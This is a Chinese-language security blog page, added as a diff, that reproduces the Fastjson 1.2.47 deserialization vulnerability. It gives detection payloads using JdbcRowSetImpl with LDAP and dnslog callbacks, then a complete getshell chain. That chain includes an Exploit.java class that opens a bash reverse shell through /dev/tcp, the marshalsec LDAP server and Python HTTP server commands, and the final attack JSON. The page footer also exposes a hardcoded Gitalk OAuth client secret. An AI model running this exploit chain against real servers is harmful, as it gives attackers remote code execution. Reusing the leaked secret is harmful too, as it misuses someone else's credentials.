@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+    <meta name="description" content="内网渗透实战篇">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    Fastjson1.2.47反序列化漏洞复现 |
+    
+    炎Φ帝</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/technology.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <section class="outer">
+  <article id="post-Fastjson1-2-47反序列化漏洞复现" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Fastjson1.2.47反序列化漏洞复现
+    </h1>
+  
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2021/02/19/Fastjson1-2-47%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
+  <time datetime="2021-02-19T07:04:58.000Z" itemprop="datePublished">2021-02-19</time>
+</a>
+        
+      </div>
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+      
+
+      
+        <p>一、简介</p>
+<pre><code>     fastjson 是阿里巴巴的开源JSON解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。</code></pre>
+<p>二、漏洞概述</p>
+<pre><code>    首先，Fastjson提供了autotype功能，允许用户在反序列化数据中通过“@type”指定反序列化的类型，其次，Fastjson自定义的反序列化机制时会调用指定类中的setter方法及部分getter方法，那么当组件开启了autotype功能并且反序列化不可信数据时，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定setter或者getter方法中，若指定类的指定方法中有可被恶意利用的逻辑（也就是通常所指的“Gadget”），则会造成一些严重的安全问题。并且在Fastjson 1.2.47及以下版本中，利用其缓存机制可实现对未开启autotype功能的绕过。
+
+    防坑指南：复现fastjson和JDK版本有关
+    　RMI &lt; 8u121、LDAP &lt; 8u182（本文复现使用LDAP）</code></pre>
+<p>三、影响版本</p>
+<pre><code>   Fastjson1.2.47以及之前的版本</code></pre>
+<p>四、漏洞复现</p>
+<pre><code>   首先我搭建了一个漏洞平台</code></pre>
+<p><img src="/images/pasted-121.png" alt="upload successful"></p>
+<pre><code>   用burp抓包，改POST请求，添加参数&#123;&quot;name&quot;:&quot;xx&quot;,&quot;age&quot;:&quot;999&quot;&#125;，查看返回，服务正常。</code></pre>
+<p><img src="/images/pasted-122.png" alt="upload successful"></p>
+<pre><code>   利用NC监听来判断漏洞是否存在：
+   &#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;x&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://自己的ip:1234/Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;&#125;
+   收到来自靶机的响应，证明漏洞存在。</code></pre>
+<p><img src="/images/pasted-123.png" alt="upload successful"></p>
+<pre><code>  利用DNSlog来判断漏洞是否存在
+  &#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;x&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://p9pjrz.dnslog.cn&quot;,&quot;autoCommit&quot;:true&#125;&#125;&#125;</code></pre>
+<p><img src="/images/pasted-124.png" alt="upload successful"></p>
+<p>五、getshell</p>
+<pre><code>   步骤：python搭建http服务——marshalsec开启监听转发——nc开启监听接收shell——攻击——反弹成功
+   工具准备：Exploit.java、marshalsec-0.0.3-SNAPSHOT-all.jar
+   先上EXP，里面的ip改为接收shell的ip，文件命名为Exploit.java
+
+   import java.io.BufferedReader;
+   import java.io.InputStream;
+   import java.io.InputStreamReader;
+
+   public class Exploit&#123;
+   public Exploit() throws Exception &#123;
+    Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/xx.xx.xx.xx/1888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;);
+    InputStream is = p.getInputStream();
+    BufferedReader reader = new BufferedReader(new InputStreamReader(is));
+
+    String line;
+    while((line = reader.readLine()) != null) &#123;
+        System.out.println(line);
+    &#125;
+
+    p.waitFor();
+    is.close();
+    reader.close();
+    p.destroy();
+&#125;
+
+public static void main(String[] args) throws Exception &#123;
+  &#125;
+&#125;</code></pre>
+<p> javac Exploit.java  形成class文件</p>
+<p><img src="/images/pasted-125.png" alt="upload successful"></p>
+<p>　——————python启http服务————<br> python -m SimpleHTTPServer 8083</p>
+<p><img src="/images/pasted-126.png" alt="upload successful"></p>
+<p>　——————marshalsec启动——————</p>
+<pre><code>  java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.0.110:8083/#Exploit 9999 Listening on 0.0.0.0:9999</code></pre>
+<p><img src="/images/pasted-128.png" alt="upload successful"></p>
+<p>——————nc开启监听——————</p>
+<p><img src="/images/pasted-129.png" alt="upload successful"></p>
+<p>——————攻击————————</p>
+<p>{<br>    “name”:{<br>         “@type”:”java.lang.Class”,<br>         “val”:”com.sun.rowset.JdbcRowSetImpl”<br>     },<br>     “x”:{<br>         “@type”:”com.sun.rowset.JdbcRowSetImpl”,<br>         “dataSourceName”:”ldap://vps:9999/Exploit”,<br>         “autoCommit”:true<br>     }</p>
+<p><img src="/images/pasted-132.png" alt="upload successful"></p>
+<p><img src="/images/pasted-131.png" alt="upload successful"></p>
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="https://priesttomb.github.io/js/md5.min.js"></script>
+<script >
+var gitalk = new Gitalk({
+  clientID: '89b3b32fddb4b2644811',
+  clientSecret: 'b6c19077bfed9b255a3a17f4d628854f21098b94',
+  repo: 'shenligang123.github.io',
+  owner: 'shenligang123',
+  admin: 'shenligang123',
+  id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+  distractionFreeMode: false  // Facebook-like distraction free mode
+})
+gitalk.render('gitalk-container')
+</script>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/19/Fastjson1-2-47%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-id="cklc2fst60002z4ut08dedbgj"
+         class="article-share-link">分享</a>
+      
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+    
+      <a href="/2021/01/26/SonicWall-SSL-VPN-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">SonicWall SSL-VPN 远程命令执行漏洞</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: '89b3b32fddb4b2644811',
+      clientSecret: 'b6c19077bfed9b255a3a17f4d628854f21098b94',
+      repo: 'shenligang123.github.io',
+      owner: 'shenligang123',
+      admin: ['shenligang123'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+    </div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+<script src="/js/technology.js"></script>
+
+
+  </div>
+</body>
+</html>
